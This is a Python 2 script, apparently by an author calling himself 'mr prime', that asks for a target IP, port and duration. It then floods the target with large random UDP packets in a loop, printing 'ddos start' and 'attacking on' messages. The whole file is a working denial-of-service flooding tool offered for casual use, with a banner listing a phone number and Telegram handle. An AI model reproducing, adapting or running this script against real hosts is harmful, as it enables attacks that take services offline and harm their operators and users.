#!/usr/bin/python
#coded by mr prime
#colors
#----------------#
wi = "\033[1;37m"
rd = "\033[1;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"
pu = "\033[1;35m"
cy = "\033[1;36m"
#----------------#
import os
import socket
import time
import random
import sys
#----------------#

def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = random._urandom(10000)

    os.system("clear")
    print '\n'
    print gr+'welcome to mr prime '
    print '''
    <-------------------------------------->
     |(@)| coded by mr prime          |(@)|
     |(@)| my number is +201210861104 |(@)|
     |(@)| my telegram is mrprime1    |(@)|
    <-------------------------------------->
    '''
    print gr+'hve fun bro '
    print ''
    ip = raw_input(rd+"[01] ip or host Target : ")
    port = input(pu+"[02] port {Default port 80} :")
    seconds = input(yl+"[03] time the Attack : ")
    timeout = time.time() + seconds

    sent = 10 

    while True:

        try:

            if time.time() > timeout:
                break

            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent = sent + 1 
            print 'ddos start'
            print cy+' attacking on %s .... ' % (ip) 
        except KeyboardInterrupt:
            print("")
            print cy+''' have a nice time \n goodbye '''
            print("\n")
            print(rd+"keybourd interrupt")
            sys.exit()

doss()
